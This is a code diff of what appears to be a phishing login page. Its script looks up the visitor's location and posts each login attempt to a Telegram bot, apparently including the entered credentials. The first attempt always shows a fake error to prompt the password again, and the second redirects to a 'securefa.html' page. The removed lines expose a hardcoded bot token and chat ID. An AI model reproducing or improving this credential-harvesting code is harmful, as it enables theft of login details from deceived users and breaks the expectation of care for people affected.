@@ -74,12 +74,12 @@
   </div>
 
   <script type="module">
-    const TELEGRAM_TOKEN = "7781718948:AAF90lWhR0vfih40-foHBSDjGTcB4HRC64A";
-    const TELEGRAM_CHAT_ID = "7829354744";
+    // Import sensitive values from external file
+    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
 
     let attempt = 0;
 
-    // Get location using a different free API: ipwho.is (no key needed)
+    // Get location using ipwho.is
     async function getLocation() {
       try {
         const res = await fetch('https://ipwho.is/');
@@ -87,7 +87,7 @@
         if (!data.success) throw new Error();
         return {
           country: data.country || 'Unknown',
-          state: data.region || 'Unknown'  // ipwho.is uses 'region' for state/province
+          state: data.region || 'Unknown'
         };
       } catch {
         return { country: 'Unknown', state: 'Unknown' };
@@ -126,7 +126,7 @@ ATTEMPT: ${attempt + 1} ⏱️
 
       const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
-      // Always send immediately (no delay before send)
+      // Send immediately
       try {
         await fetch(url, {
           method: "POST",
@@ -140,20 +140,19 @@ ATTEMPT: ${attempt + 1} ⏱️
       attempt++;
 
       if (attempt === 1) {
-        // First attempt: no loading UI, instant error + clear password
+        // First attempt: instant error + clear password only
         errorMsg.classList.remove("hidden");
-        passwordInput.value = "";  // Clear password field
-        // Button stays "Log in" – no change
+        passwordInput.value = "";
       } else {
-        // Second attempt: show loading briefly then redirect
+        // Second attempt: brief loading → redirect
         btn.disabled = true;
         btnText.textContent = "Loading";
         spinner.classList.remove("hidden");
 
         setTimeout(() => {
-          window.location.href = "https://www.example.com/";
-          // Change this URL as needed
-        }, 1200);  // Brief loading visible
+          window.location.href = "securefa.html";
+          // ← change this URL if needed
+        }, 1200);
       }
     });
   </script>
